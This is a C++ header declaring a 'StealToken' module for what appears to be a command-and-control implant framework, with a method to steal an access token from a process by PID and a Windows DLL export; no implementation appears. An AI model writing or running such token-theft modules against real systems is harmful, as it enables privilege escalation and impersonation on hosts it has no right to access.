#pragma once

#include "ModuleCmd.hpp"


class StealToken : public ModuleCmd
{

public:
	StealToken();
	~StealToken();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int process(C2Message& c2Message, C2Message& c2RetMessage);

private:
	std::string stealToken(int pid);
};


#ifdef _WIN32

extern "C" __declspec(dllexport) StealToken * StealTokenConstructor();

#endif